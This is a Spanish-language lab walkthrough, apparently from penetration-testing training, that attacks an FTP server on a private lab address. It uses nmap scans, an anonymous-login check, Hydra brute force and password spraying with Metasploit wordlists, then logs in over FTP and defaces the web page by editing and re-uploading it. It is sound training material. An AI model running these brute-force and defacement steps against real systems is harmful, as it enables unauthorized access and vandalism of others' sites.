Primero revisamos los servicios abiertos y la información que tengamos de ellos, para ello escanearemos los servicios con nmap
```
nmap -sV -sC -p21,80 10.2.22.126
```
![[Pasted image 20240424080959.png]]

Ahora comprobaremos si esta habilitado el usuario anonymous de ftp, con el siguiente comando veremos todos los scrips que tenemos de nmap para el protocolo ftp
```
ls -la /usr/share/nmap/scripts/ftp*
```

```
ls -la /usr/share/namp/scripts/ | grep ftp-
```
![[Pasted image 20240424082154.png]]

Como podemos ver en la sigueinte imagen intentamos acceder desde el usuario anonimo pero no obtenemos resultado
```
nmap -sV -p21 --script=ftp-anon 10.2.22.126
```
![[Pasted image 20240424081759.png]]

Ahora con la herramienta de hydra realizaremos un ataque de fuerza bruta
```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P/usr/share/wordlists/metasploit/unix_passwords.txt 10.2.22.126 ftp
```
![[Pasted image 20240424082917.png]]

Como podemos ver nos ha encontrado un usuario, ahora probaremos con la contraseña que tenemos si hay mas usuarios con la misma contraseña
```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p vagrant 10.2.22.126 ftp
```
![[Pasted image 20240424083040.png]]

Como podemos ver hemos obtenido dos usuarios con la misma password, ahora accederemos con los usuarios por ftp
```
ftp 10.2.22.126
```
![[Pasted image 20240424083144.png]]

Como podemos ver hemos obtenido acceso, ahora podremos hacer diversas cosas, como por ejemplo modificar el contenido de la web, para ello nos descargaremos el documento
![[Pasted image 20240424083348.png]]

Esta es la pagina de serie
![[Pasted image 20240424083504.png]]

Modificamos el contenido
![[Pasted image 20240424083710.png]]

Lo volvemos a subir con las modificaciones
![[Pasted image 20240424083819.png]]

Al refrescar podemos ver que hemos eliminado la pagina y el fondo a pasado de negro a blanco
![[Pasted image 20240424083850.png]]

